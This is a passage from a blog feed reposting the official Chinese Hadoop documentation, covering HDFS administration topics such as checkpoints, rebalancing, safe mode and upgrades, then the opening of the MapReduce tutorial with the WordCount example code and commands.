NameNode</h2><p>NameNode将对文件系统的改动追加保存到本地文件系统上的一个日志文件（edits）。当一个NameNode启动时，它首先从一个映像文件（fsimage）中读取HDFS的状态，接着应用日志文件中的edits操作。然后它将新的HDFS状态写入（fsimage）中，并使用一个空的edits文件开始正常操作。因为NameNode只有在启动阶段才合并fsimage和edits，所以久而久之日志文件可能会变得非常庞大，特别是对大型的集群。日志文件太大的另一个副作用是下一次NameNode启动会花很长时间。</p><p>Secondary NameNode定期合并fsimage和edits日志，将edits日志文件大小控制在一个限度下。因为内存需求和NameNode在一个数量级上，所以通常secondary NameNode和NameNode运行在不同的机器上。Secondary NameNode通过bin/start-dfs.sh在conf/masters中指定的节点上启动。</p><p>Secondary NameNode的检查点进程启动，是由两个配置参数控制的：</p><ul><li>fs.checkpoint.period，指定连续两次检查点的最大时间间隔， 默认值是1小时。</li><li>fs.checkpoint.size定义了edits日志文件的最大值，一旦超过这个值会导致强制执行检查点（即使没到检查点的最大时间间隔）。默认值是64MB。</li></ul><p>Secondary NameNode保存最新检查点的目录与NameNode的目录结构相同。 所以NameNode可以在需要的时候读取Secondary NameNode上的检查点镜像。</p><p>如果NameNode上除了最新的检查点以外，所有的其他的历史镜像和edits文件都丢失了， NameNode可以引入这个最新的检查点。以下操作可以实现这个功能：</p><ul><li>在配置参数dfs.name.dir指定的位置建立一个空文件夹；</li><li>把检查点目录的位置赋值给配置参数fs.checkpoint.dir；</li><li>启动NameNode，并加上-importCheckpoint。</li></ul><p>NameNode会从fs.checkpoint.dir目录读取检查点， 并把它保存在dfs.name.dir目录下。 如果dfs.name.dir目录下有合法的镜像文件，NameNode会启动失败。 NameNode会检查fs.checkpoint.dir目录下镜像文件的一致性，但是不会去改动它。</p><p>命令的使用方法请参考<a href="http://hadoop.apache.org/docs/r1.0.4/cn/commands_manual.html#secondarynamenode" target="_blank" rel="noopener">secondarynamenode 命令</a>.</p><h2 id="Rebalancer"><a href="#Rebalancer" class="headerlink" title="Rebalancer"></a>Rebalancer</h2><p>HDFS的数据也许并不是非常均匀的分布在各个DataNode中。一个常见的原因是在现有的集群上经常会增添新的DataNode节点。当新增一个数据块（一个文件的数据被保存在一系列的块中）时，NameNode在选择DataNode接收这个数据块之前，会考虑到很多因素。其中的一些考虑的是：</p><ul><li>将数据块的一个副本放在正在写这个数据块的节点上。</li><li>尽量将数据块的不同副本分布在不同的机架上，这样集群可在完全失去某一机架的情况下还能存活。</li><li>一个副本通常被放置在和写文件的节点同一机架的某个节点上，这样可以减少跨越机架的网络I/O。</li><li>尽量均匀地将HDFS数据分布在集群的DataNode中。</li></ul><p>由于上述多种考虑需要取舍，数据可能并不会均匀分布在DataNode中。HDFS为管理员提供了一个工具，用于分析数据块分布和重新平衡DataNode上的数据分布。<a href="http://issues.apache.org/jira/browse/HADOOP-1652" target="_blank" rel="noopener">HADOOP-1652</a>的附件中的一个<a href="http://issues.apache.org/jira/secure/attachment/12368261/RebalanceDesign6.pdf" target="_blank" rel="noopener">PDF</a>是一个简要的rebalancer管理员指南。</p><p>使用方法请参考<a href="http://hadoop.apache.org/docs/r1.0.4/cn/commands_manual.html#balancer" target="_blank" rel="noopener">balancer 命令</a>.</p><h2 id="机架感知（Rack-awareness）"><a href="#机架感知（Rack-awareness）" class="headerlink" title="机架感知（Rack awareness）"></a>机架感知（Rack awareness）</h2><p>通常，大型Hadoop集群是以机架的形式来组织的，同一个机架上不同节点间的网络状况比不同机架之间的更为理想。另外，NameNode设法将数据块副本保存在不同的机架上以提高容错性。Hadoop允许集群的管理员通过配置dfs.network.script参数来确定节点所处的机架。当这个脚本配置完毕，每个节点都会运行这个脚本来获取它的机架ID。默认的安装假定所有的节点属于同一个机架。这个特性及其配置参数在<a href="http://issues.apache.org/jira/browse/HADOOP-692" target="_blank" rel="noopener">HADOOP-692</a>所附的<a href="http://issues.apache.org/jira/secure/attachment/12345251/Rack_aware_HDFS_proposal.pdf" target="_blank" rel="noopener">PDF</a>上有更详细的描述。</p><h2 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h2><p>NameNode启动时会从fsimage和edits日志文件中装载文件系统的状态信息，接着它等待各个DataNode向它报告它们各自的数据块状态，这样，NameNode就不会过早地开始复制数据块，即使在副本充足的情况下。这个阶段，NameNode处于安全模式下。NameNode的安全模式本质上是HDFS集群的一种只读模式，此时集群不允许任何对文件系统或者数据块修改的操作。通常NameNode会在开始阶段自动地退出安全模式。如果需要，你也可以通过’bin/hadoop dfsadmin -safemode’命令显式地将HDFS置于安全模式。NameNode首页会显示当前是否处于安全模式。关于安全模式的更多介绍和配置信息请参考JavaDoc：<a href="https://hadoop.apache.org/core/docs/current/api/org/apache/hadoop/dfs/NameNode.html#setSafeMode(org.apache.hadoop.dfs.FSConstants.SafeModeAction" target="_blank" rel="noopener">setSafeMode()</a>)。</p><h2 id="fsck"><a href="#fsck" class="headerlink" title="fsck"></a>fsck</h2><p>HDFS支持fsck命令来检查系统中的各种不一致状况。这个命令被设计来报告各种文件存在的问题，比如文件缺少数据块或者副本数目不够。不同于在本地文件系统上传统的fsck工具，这个命令并不会修正它检测到的错误。一般来说，NameNode会自动修正大多数可恢复的错误。HDFS的fsck不是一个Hadoop shell命令。它通过’bin/hadoop fsck’执行。 命令的使用方法请参考<a href="http://hadoop.apache.org/docs/r1.0.4/cn/commands_manual.html#fsck" target="_blank" rel="noopener">fsck命令</a> fsck可用来检查整个文件系统，也可以只检查部分文件。</p><h2 id="升级和回滚"><a href="#升级和回滚" class="headerlink" title="升级和回滚"></a>升级和回滚</h2><p>当在一个已有集群上升级Hadoop时，像其他的软件升级一样，可能会有新的bug或一些会影响到现有应用的非兼容性变更出现。在任何有实际意义的HDSF系统上，丢失数据是不被允许的，更不用说重新搭建启动HDFS了。HDFS允许管理员退回到之前的Hadoop版本，并将集群的状态回滚到升级之前。更多关于HDFS升级的细节在<a href="https://wiki.apache.org/hadoop/Hadoop Upgrade" target="_blank" rel="noopener">升级wiki</a>上可以找到。HDFS在一个时间可以有一个这样的备份。在升级之前，管理员需要用bin/hadoop dfsadmin -finalizeUpgrade（升级终结操作）命令删除存在的备份文件。下面简单介绍一下一般的升级过程：</p><ul><li>升级 Hadoop 软件之前，请检查是否已经存在一个备份，如果存在，可执行升级终结操作删除这个备份。通过dfsadmin -upgradeProgress status命令能够知道是否需要对一个集群执行升级终结操作。</li><li>停止集群并部署新版本的Hadoop。</li><li>使用-upgrade选项运行新的版本（bin/start-dfs.sh -upgrade）。</li><li>在大多数情况下，集群都能够正常运行。一旦我们认为新的HDFS运行正常（也许经过几天的操作之后），就可以对之执行升级终结操作。注意，在对一个集群执行升级终结操作之前，删除那些升级前就已经存在的文件并不会真正地释放DataNodes上的磁盘空间。</li><li>如果需要退回到老版本，<ul><li>停止集群并且部署老版本的Hadoop。</li><li>用回滚选项启动集群（bin/start-dfs.h -rollback）。</li></ul></li></ul><h2 id="文件权限和安全性"><a href="#文件权限和安全性" class="headerlink" title="文件权限和安全性"></a>文件权限和安全性</h2><p>这里的文件权限和其他常见平台如Linux的文件权限类似。目前，安全性仅限于简单的文件权限。启动NameNode的用户被视为HDFS的超级用户。HDFS以后的版本将会支持网络验证协议（比如Kerberos）来对用户身份进行验证和对数据进行加密传输。具体的细节请参考<a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_permissions_guide.html" target="_blank" rel="noopener">权限使用管理指南</a>。</p><h2 id="可扩展性"><a href="#可扩展性" class="headerlink" title="可扩展性"></a>可扩展性</h2><p>现在，Hadoop已经运行在上千个节点的集群上。<a href="https://wiki.apache.org/hadoop/PoweredBy" target="_blank" rel="noopener">Powered By Hadoop</a>页面列出了一些已将Hadoop部署在他们的大型集群上的组织。HDFS集群只有一个NameNode节点。目前，NameNode上可用内存大小是一个主要的扩展限制。在超大型的集群中，增大HDFS存储文件的平均大小能够增大集群的规模，而不需要增加NameNode的内存。默认配置也许并不适合超大规模的集群。<a href="https://wiki.apache.org/hadoop/FAQ" target="_blank" rel="noopener">Hadoop FAQ</a>页面列举了针对大型Hadoop集群的配置改进。</p><h2 id="相关文档"><a href="#相关文档" class="headerlink" title="相关文档"></a>相关文档</h2><p>这个用户手册给用户提供了一个学习和使用HDSF文件系统的起点。本文档会不断地进行改进，同时，用户也可以参考更多的Hadoop和HDFS文档。下面的列表是用户继续学习的起点：</p><ul><li><a href="https://hadoop.apache.org/" target="_blank" rel="noopener">Hadoop官方主页</a>：所有Hadoop相关的起始页。</li><li><a href="https://wiki.apache.org/hadoop/FrontPage" target="_blank" rel="noopener">Hadoop Wiki</a>：Hadoop Wiki文档首页。这个指南是Hadoop代码树中的一部分，与此不同，Hadoop Wiki是由Hadoop社区定期编辑的。</li><li>Hadoop Wiki上的<a href="https://wiki.apache.org/hadoop/FAQ" target="_blank" rel="noopener">FAQ</a>。</li><li>Hadoop <a href="https://hadoop.apache.org/core/docs/current/api/" target="_blank" rel="noopener">JavaDoc API</a>。</li><li>Hadoop用户邮件列表：<a href="mailto:core-user@hadoop.apache.org">core-user[at]hadoop.apache.org</a>。</li><li>查看conf/hadoop-default.xml文件。这里包括了大多数配置参数的简要描述。</li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/commands_manual.html" target="_blank" rel="noopener">命令手册</a>：命令使用说明。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop MapReduce教程</title>
      <link href="2020/06/25/hadoop-mapreduce-jiao-cheng/"/>
      <url>2020/06/25/hadoop-mapreduce-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<p>此文章转载于<a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html" target="_blank" rel="noopener">Hadoop官方中文文档</a></p><ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#目的" target="_blank" rel="noopener">目的</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#先决条件" target="_blank" rel="noopener">先决条件</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#概述" target="_blank" rel="noopener">概述</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#输入与输出" target="_blank" rel="noopener">输入与输出</a></li><li>例子：WordCount v1.0<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#源代码" target="_blank" rel="noopener">源代码</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#用法" target="_blank" rel="noopener">用法</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#解释" target="_blank" rel="noopener">解释</a></li></ul></li><li>Map/Reduce - 用户界面<ul><li>核心功能描述<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#Mapper" target="_blank" rel="noopener">Mapper</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#Reducer" target="_blank" rel="noopener">Reducer</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#Partitioner" target="_blank" rel="noopener">Partitioner</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#Reporter" target="_blank" rel="noopener">Reporter</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#OutputCollector" target="_blank" rel="noopener">OutputCollector</a></li></ul></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#作业配置" target="_blank" rel="noopener">作业配置</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#任务的执行和环境" target="_blank" rel="noopener">任务的执行和环境</a></li><li>作业的提交与监控<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#作业的控制" target="_blank" rel="noopener">作业的控制</a></li></ul></li><li>作业的输入<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#InputSplit" target="_blank" rel="noopener">InputSplit</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#RecordReader" target="_blank" rel="noopener">RecordReader</a></li></ul></li><li>作业的输出<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#任务的Side-Effect+File" target="_blank" rel="noopener">任务的Side-Effect File</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#RecordWriter" target="_blank" rel="noopener">RecordWriter</a></li></ul></li><li>其他有用的特性<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#Counters" target="_blank" rel="noopener">Counters</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#DistributedCache" target="_blank" rel="noopener">DistributedCache</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#Tool" target="_blank" rel="noopener">Tool</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#IsolationRunner" target="_blank" rel="noopener">IsolationRunner</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#Profiling" target="_blank" rel="noopener">Profiling</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#调试" target="_blank" rel="noopener">调试</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#JobControl" target="_blank" rel="noopener">JobControl</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#数据压缩" target="_blank" rel="noopener">数据压缩</a></li></ul></li></ul></li><li>例子：WordCount v2.0<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#源代码-N10DC0" target="_blank" rel="noopener">源代码</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#运行样例" target="_blank" rel="noopener">运行样例</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#程序要点" target="_blank" rel="noopener">程序要点</a></li></ul></li></ul><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>这篇教程从用户的角度出发，全面地介绍了Hadoop Map/Reduce框架的各个方面。</p><h2 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h2><p>请先确认Hadoop被正确安装、配置和正常运行中。更多信息见：</p><ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html" target="_blank" rel="noopener">Hadoop快速入门</a>对初次使用者。</li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/cluster_setup.html" target="_blank" rel="noopener">Hadoop集群搭建</a>对大规模分布式集群。</li></ul><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Hadoop Map/Reduce是一个使用简易的软件框架，基于它写出来的应用程序能够运行在由上千个商用机器组成的大型集群上，并以一种可靠容错的方式并行处理上T级别的数据集。</p><p>一个Map/Reduce <em>作业（job）</em> 通常会把输入的数据集切分为若干独立的数据块，由 <em>map任务（task）</em>以完全并行的方式处理它们。框架会对map的输出先进行排序， 然后把结果输入给<em>reduce任务</em>。通常作业的输入和输出都会被存储在文件系统中。 整个框架负责任务的调度和监控，以及重新执行已经失败的任务。</p><p>通常，Map/Reduce框架和<a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_design.html" target="_blank" rel="noopener">分布式文件系统</a>是运行在一组相同的节点上的，也就是说，计算节点和存储节点通常在一起。这种配置允许框架在那些已经存好数据的节点上高效地调度任务，这可以使整个集群的网络带宽被非常高效地利用。</p><p>Map/Reduce框架由一个单独的master JobTracker 和每个集群节点一个slave TaskTracker共同组成。master负责调度构成一个作业的所有任务，这些任务分布在不同的slave上，master监控它们的执行，重新执行已经失败的任务。而slave仅负责执行由master指派的任务。</p><p>应用程序至少应该指明输入/输出的位置（路径），并通过实现合适的接口或抽象类提供map和reduce函数。再加上其他作业的参数，就构成了<em>作业配置（job configuration）</em>。然后，Hadoop的 <em>job client</em>提交作业（jar包/可执行程序等）和配置信息给JobTracker，后者负责分发这些软件和配置信息给slave、调度任务并监控它们的执行，同时提供状态和诊断信息给job-client。</p><p>虽然Hadoop框架是用JavaTM实现的，但Map/Reduce应用程序则不一定要用 Java来写 。</p><ul><li><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/streaming/package-summary.html" target="_blank" rel="noopener">Hadoop Streaming</a>是一种运行作业的实用工具，它允许用户创建和运行任何可执行程序 （例如：Shell工具）来做为mapper和reducer。</li><li><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/pipes/package-summary.html" target="_blank" rel="noopener">Hadoop Pipes</a>是一个与<a href="http://www.swig.org/" target="_blank" rel="noopener">SWIG</a>兼容的C++ API （没有基于JNITM技术），它也可用于实现Map/Reduce应用程序。</li></ul><h2 id="输入与输出"><a href="#输入与输出" class="headerlink" title="输入与输出"></a>输入与输出</h2><p>Map/Reduce框架运转在<key, value> 键值对上，也就是说， 框架把作业的输入看为是一组<key, value> 键值对，同样也产出一组 <key, value> 键值对做为作业的输出，这两组键值对的类型可能不同。</p><p>框架需要对key和value的类(classes)进行序列化操作， 因此，这些类需要实现 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/io/Writable.html" target="_blank" rel="noopener">Writable</a>接口。 另外，为了方便框架执行排序操作，key类必须实现 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/io/WritableComparable.html" target="_blank" rel="noopener">WritableComparable</a>接口。</p><p>一个Map/Reduce 作业的输入和输出类型如下所示：</p><p>(input) <k1, v1> -&gt; <strong>map</strong> -&gt; <k2, v2> -&gt; <strong>combine</strong> -&gt; <k2, v2> -&gt; <strong>reduce</strong> -&gt; <k3, v3> (output)</p><h2 id="例子：WordCount-v1-0"><a href="#例子：WordCount-v1-0" class="headerlink" title="例子：WordCount v1.0"></a>例子：WordCount v1.0</h2><p>在深入细节之前，让我们先看一个Map/Reduce的应用示例，以便对它们的工作方式有一个初步的认识。</p><p>WordCount是一个简单的应用，它可以计算出指定数据集中每一个单词出现的次数。</p><p>这个应用适用于 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html#Standalone+Operation" target="_blank" rel="noopener">单机模式</a>， <a href="http://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html#SingleNodeSetup" target="_blank" rel="noopener">伪分布式模式</a> 或 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html#Fully-Distributed+Operation" target="_blank" rel="noopener">完全分布式模式</a> 三种Hadoop安装方式。</p><p><strong>源代码</strong></p><pre class=" language-lang-java"><code class="language-lang-java">package org.myorg;import java.io.IOException;import java.util.*;import org.apache.hadoop.fs.Path;import org.apache.hadoop.conf.*;import org.apache.hadoop.io.*;import org.apache.hadoop.mapred.*;import org.apache.hadoop.util.*;public class WordCount {   public static class Map extends MapReduceBase implements Mapper<LongWritable, Text, Text, IntWritable> {     private final static IntWritable one = new IntWritable(1);     private Text word = new Text();     public void map(LongWritable key, Text value, OutputCollector<Text, IntWritable> output, Reporter reporter) throws IOException {       String line = value.toString();       StringTokenizer tokenizer = new StringTokenizer(line);       while (tokenizer.hasMoreTokens()) {         word.set(tokenizer.nextToken());         output.collect(word, one);       }     }   }   public static class Reduce extends MapReduceBase implements Reducer<Text, IntWritable, Text, IntWritable> {     public void reduce(Text key, Iterator<IntWritable> values, OutputCollector<Text, IntWritable> output, Reporter reporter) throws IOException {       int sum = 0;       while (values.hasNext()) {         sum += values.next().get();       }       output.collect(key, new IntWritable(sum));     }   }   public static void main(String[] args) throws Exception {     JobConf conf = new JobConf(WordCount.class);     conf.setJobName("wordcount");     conf.setOutputKeyClass(Text.class);     conf.setOutputValueClass(IntWritable.class);     conf.setMapperClass(Map.class);     conf.setCombinerClass(Reduce.class);     conf.setReducerClass(Reduce.class);     conf.setInputFormat(TextInputFormat.class);     conf.setOutputFormat(TextOutputFormat.class);     FileInputFormat.setInputPaths(conf, new Path(args[0]));     FileOutputFormat.setOutputPath(conf, new Path(args[1]));     JobClient.runJob(conf);   }}</code></pre><p>假设环境变量HADOOP_HOME对应安装时的根目录，HADOOP_VERSION对应Hadoop的当前安装版本，编译WordCount.java来创建jar包，可如下操作：</p><p>$ mkdir wordcount_classes<br>$ javac -classpath ${HADOOP_HOME}/hadoop-${HADOOP_VERSION}-core.jar -d wordcount_classes WordCount.java<br>$ jar -cvf /usr/joe/wordcount.jar -C wordcount_classes/ .</p><p>假设：</p><ul><li>/usr/joe/wordcount/input - 是HDFS中的输入路径</li><li>/usr/joe/wordcount/output - 是HDFS中的输出路径</li></ul><p>用示例文本文件做为输入：</p><p>$ bin/hadoop dfs -ls /usr/joe/wordcount/input/<br>/usr/joe/wordcount/input/file01<br>/usr/joe/wordcount/input/file02</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/input/file01<br>Hello World Bye World</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/input/file02<br>Hello Hadoop Goodbye Hadoop</p><p>运行应用程序：</p><p>$ bin/hadoop jar /usr/joe/wordcount.jar org.myorg.WordCount /usr/joe/wordcount/input /usr/joe/wordcount/output</p><p>输出是：</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/output/part-00000<br>Bye 1<br>Goodbye 1<br>Hadoop 2<br>Hello 2<br>World 2</p><p>应用程序能够使用-files选项来指定一个由逗号分隔的路径列表，这些路径是task的当前工作目录。使用选项-libjars可以向map和reduce的classpath中添加jar包。使用-archives选项程序可以传递档案文件做为参数，这些档案文件会被解压并且在task的当前工作目录下会创建一个指向解压生成的目录的符号链接（以压缩包的名字命名）。 有关命令行选项的更多细节请参考 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/commands_manual.html" target="_blank" rel="noopener">Commands manual</a>。</p><p>使用-libjars和-files运行wordcount例子：<br>hadoop jar hadoop-examples.jar wordcount -files cachefile.txt -libjars mylib.jar input output</p><p>WordCount应用程序非常直截了当。</p><p>Mapper(14-26行)中的map方法(18-25行)通过指定的 TextInputFormat(49行)一次处理一行。然后，它通过StringTokenizer 以空格为分隔符将一行切分为若干tokens，之后，输出&lt; <word>, 1&gt; 形式的键值对。</p><p>对于示例中的第一个输入，map输出是：<br>&lt; Hello, 1&gt;<br>&lt; World, 1&gt;<br>&lt; Bye, 1&gt;<br>&lt; World, 1&gt;</p><p>第二个输入，map输出是：<br>&lt; Hello, 1&gt;<br>&lt; Hadoop, 1&gt;<br>&lt; Goodbye, 1&gt;<br>&lt; Hadoop, 1&gt;</p><p>关于组成一个指定作业的map数目的确定，以及如何以更精细的方式去控制这些map，我们将在教程的后续部分学习到更多的内容。</p><p>WordCount还指定了一个combiner (46行)。因此，每次map运行之后，会对输出按照<em>key</em>进行排序，然后把输出传递给本地的combiner（按照作业的配置与Reducer一样），进行本地聚合。</p><p>第一个map的输出是：<br>&lt; Bye, 1&gt;<br>&lt; Hello, 1&gt;<br>&lt; World, 2&gt;</p><p>第二个map的输出是：<br>&lt; Goodbye, 1&gt;<br>&lt; Hadoop, 2&gt;<br>&lt; Hello, 1&gt;</p><p>Reducer(28-36行)中的reduce方法(29-35行) 仅是将每个key（本例中就是单词）出现的次数求和。</p><p>因此这个作业的输出就是：<br>&lt; Bye, 1&gt;<br>&lt; Goodbye, 1&gt;<br>&lt; Hadoop, 2&gt;<br>&lt; Hello, 2&gt;<br>&lt; World, 2&gt;</p><p>代码中的run方法中指定了作业的几个方面， 例如：通过命令行传递过来的输入/输出路径、key/value的类型、输入/输出的格式等等JobConf中的配置信息。随后程序调用了JobClient.runJob(55行)来提交作业并且监控它的执行。</p><p>我们将在本教程的后续部分学习更多的关于JobConf， JobClient， Tool和其他接口及类(class)。</p><h2 id="Map-Reduce-用户界面"><a href="#Map-Reduce-用户界面" class="headerlink" title="Map/Reduce - 用户界面"></a>Map/Reduce - 用户界面</h2><p>这部分文档为用户将会面临的Map/Reduce框架中的各个环节提供了适当的细节。这应该会帮助用户更细粒度地去实现、配置和调优作业。然而，请注意每个类/接口的javadoc文档提供最全面的文档；本文只是想起到指南的作用。</p><p>我们会先看看Mapper和Reducer接口。应用程序通常会通过提供map和reduce方法来实现它们。</p><p>然后，我们会讨论其他的核心接口，其中包括： JobConf，JobClient，Partitioner， OutputCollector，Reporter， InputFormat，OutputFormat等等。</p><p>最后，我们将通过讨论框架中一些有用的功能点（例如：DistributedCache， IsolationRunner等等）来收尾。</p><p>应用程序通常会通过提供map和reduce来实现 Mapper和Reducer接口，它们组成作业的核心。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Mapper.html" target="_blank" rel="noopener">Mapper</a>将输入键值对(key/value pair)映射到一组中间格式的键值对集合。</p><p>Map是一类将输入记录集转换为中间格式记录集的独立任务。 这种转换的中间格式记录集不需要与输入记录集的类型一致。一个给定的输入键值对可以映射成0个或多个输出键值对。</p><p>Hadoop Map/Reduce框架为每一个InputSplit产生一个map任务，而每个InputSplit是由该作业的InputFormat产生的。</p><p>概括地说，对Mapper的实现者需要重写 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConfigurable.html#configure(org.apache.hadoop.mapred.JobConf" target="_blank" rel="noopener">JobConfigurable.configure(JobConf)</a>)方法，这个方法需要传递一个JobConf参数，目的是完成Mapper的初始化工作。然后，框架为这个任务的InputSplit中每个键值对调用一次 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Mapper.html#map(K1, V1, org.apache.hadoop.mapred.OutputCollector, org.apache.hadoop.mapred.Reporter" target="_blank" rel="noopener">map(WritableComparable, Writable, OutputCollector, Reporter)</a>)操作。应用程序可以通过重写<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/io/Closeable.html#close(" target="_blank" rel="noopener">Closeable.close()</a>)方法来执行相应的清理工作。</p><p>输出键值对不需要与输入键值对的类型一致。一个给定的输入键值对可以映射成0个或多个输出键值对。通过调用<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/OutputCollector.html#collect(K, V" target="_blank" rel="noopener"> OutputCollector.collect(WritableComparable,Writable)</a>)可以收集输出的键值对。</p><p>应用程序可以使用Reporter报告进度，设定应用级别的状态消息，更新Counters（计数器），或者仅是表明自己运行正常。</p><p>框架随后会把与一个特定key关联的所有中间过程的值（value）分成组，然后把它们传给Reducer以产出最终的结果。用户可以通过 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setOutputKeyComparatorClass(java.lang.Class" target="_blank" rel="noopener">JobConf.setOutputKeyComparatorClass(Class)</a>)来指定具体负责分组的 Comparator。</p><p>Mapper的输出被排序后，就被划分给每个Reducer。分块的总数目和一个作业的reduce任务的数目是一样的。用户可以通过实现自定义的 Partitioner来控制哪个key被分配给哪个 Reducer。</p><p>用户可选择通过<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setCombinerClass(java.lang.Class" target="_blank" rel="noopener"> JobConf.setCombinerClass(Class)</a>)指定一个combiner，它负责对中间过程的输出进行本地的聚集，这会有助于降低从Mapper到 Reducer数据传输量。</p><p>这些被排好序的中间过程的输出结果保存的格式是(key-len, key, value-len, value)，应用程序可以通过JobConf控制对这些中间结果是否进行压缩以及怎么压缩，使用哪种<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/io/compress/CompressionCodec.html" target="_blank" rel="noopener"> CompressionCodec</a>。</p><p>Map的数目通常是由输入数据的大小决定的，一般就是所有输入文件的总块（block）数。</p><p>Map正常的并行规模大致是每个节点（node）大约10到100个map，对于CPU 消耗较小的map任务可以设到300个左右。由于每个任务初始化需要一定的时间，因此，比较合理的情况是map执行的时间至少超过1分钟。</p><p>这样，如果你输入10TB的数据，每个块（block）的大小是128MB，你将需要大约82,000个map来完成任务，除非使用 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setNumMapTasks(int" target="_blank" rel="noopener">setNumMapTasks(int)</a>)（注意：这里仅仅是对框架进行了一个提示(hint)，实际决定因素见<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setNumMapTasks(int" target="_blank" rel="noopener">这里</a>)）将这个数值设置得更高。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reducer.html" target="_blank" rel="noopener">Reducer</a>将与一个key关联的一组中间数值集归约（reduce）为一个更小的数值集。</p><p>用户可以通过<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setNumReduceTasks(int" target="_blank" rel="noopener"> JobConf.setNumReduceTasks(int)</a>)设定一个作业中reduce任务的数目。</p><p>概括地说，对Reducer的实现者需要重写 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConfigurable.html#configure(org.apache.hadoop.mapred.JobConf" target="_blank" rel="noopener">JobConfigurable.configure(JobConf)</a>)方法，这个方法需要传递一个JobConf参数，目的是完成Reducer的初始化工作。然后，框架为成组的输入数据中的每个<key, (list of values)>对调用一次 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reducer.html#reduce(K2, java.util.Iterator, org.apache.hadoop.mapred.OutputCollector, org.apache.hadoop.mapred.Reporter" target="_blank" 